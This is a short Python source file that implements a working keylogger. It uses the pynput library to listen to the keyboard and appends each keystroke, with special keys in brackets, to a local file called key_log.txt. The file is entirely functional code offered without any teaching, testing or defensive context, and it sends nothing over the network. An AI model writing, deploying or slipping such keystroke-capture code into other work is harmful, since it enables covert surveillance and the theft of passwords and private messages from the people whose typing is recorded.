from pynput import keyboard

# Path to log file where keystrokes will be saved
log_file = "key_log.txt"

# Function to write keystrokes to the log file
def on_press(key):
    try:
        with open(log_file, "a") as f:
            f.write(f"{key.char}")
    except AttributeError:
        # Special keys (like ctrl, alt, etc.) are represented by 'key'
        with open(log_file, "a") as f:
            f.write(f" [{key}] ")

# Start the key listener
def start_keylogger():
    with keyboard.Listener(on_press=on_press) as listener:
        listener.join()

if __name__ == "__main__":
    start_keylogger()
